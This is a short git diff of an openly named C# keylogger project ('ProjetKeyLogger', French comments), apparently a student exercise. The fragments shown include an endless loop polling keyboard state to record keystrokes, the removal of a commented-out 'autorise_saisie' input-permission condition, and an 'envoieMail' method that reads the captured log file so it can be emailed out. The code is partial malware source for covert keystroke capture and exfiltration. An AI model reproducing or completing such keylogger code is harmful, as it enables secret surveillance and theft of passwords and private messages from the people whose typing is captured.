@@ -58,6 +58,8 @@ namespace ProjetKeyLogger
             bool ctrl = false;
             bool altgr = false;
 
+
+
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                
@@ -73,8 +75,9 @@ namespace ProjetKeyLogger
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
-                    if (statut_cle == 32769) //&& autorise_saisie == true)
+                    if (statut_cle == 32769)
                     {
+
                         string valeurs;
                         switch (codeASCII)
                         {
@@ -368,7 +371,6 @@ namespace ProjetKeyLogger
         //Envoyer du fichier par mail
         private void envoieMail()
         {
-
             //recuperation du contenu du fichier
             string contenu_fichier = File.ReadAllText(file_path);
 
